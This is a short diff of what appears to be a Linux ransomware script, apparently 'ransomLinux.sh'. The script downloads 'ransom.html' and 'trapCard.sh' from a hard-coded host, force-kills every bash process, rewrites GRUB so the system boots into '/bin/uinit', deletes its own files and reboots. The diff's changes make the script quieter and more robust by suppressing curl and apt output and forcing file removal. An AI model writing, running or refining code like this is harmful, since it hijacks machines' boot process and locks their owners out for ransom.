@@ -15,10 +15,10 @@ fi
 url=http://10.0.0.45/ 
 
 for f in ransom.html trapCard.sh; do
- curl "$url$f" > $f
+ curl -s "$url$f" > $f
 done
 
-apt install lynx -y >/dev/null
+apt install lynx -y >/dev/null 2>&1
 
 #kill all bash
 kill -9 `lsof | grep /bin/bash | awk '{print $2}'`
@@ -36,7 +36,7 @@ sed -i '/.*GRUB_CMDLINE_LINUX=.*/c\GRUB_CMDLINE_LINUX_="init=/bin/uinit"' /etc/d
 sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/default/grub.d/50-curtin-settings.cfg
 update-grub
 
-rm trapCard.sh
-rm ransom.html
-rm ransomLinux.sh
+rm -f trapCard.sh
+rm -f ransom.html
+rm -f ransomLinux.sh
 reboot
